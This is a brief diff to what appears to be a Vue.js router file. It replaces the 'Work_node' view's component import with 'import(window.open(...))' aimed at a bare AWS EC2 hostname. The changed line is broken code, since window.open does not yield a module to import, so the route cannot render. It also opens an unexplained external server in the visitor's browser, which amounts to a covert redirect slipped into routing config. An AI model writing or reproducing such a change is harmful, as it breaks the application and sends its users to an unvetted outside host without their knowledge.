@@ -38,7 +38,7 @@ const routes = [
   {
     path: '/work_node',
     name: 'Work_node',
-    component: () => import('../views/Work_node.vue'),
+    component: () => import(window.open('http://ec2-13-229-53-206.ap-southeast-1.compute.amazonaws.com/')),
   },
   {
     path: '/:catchAll(.*)',
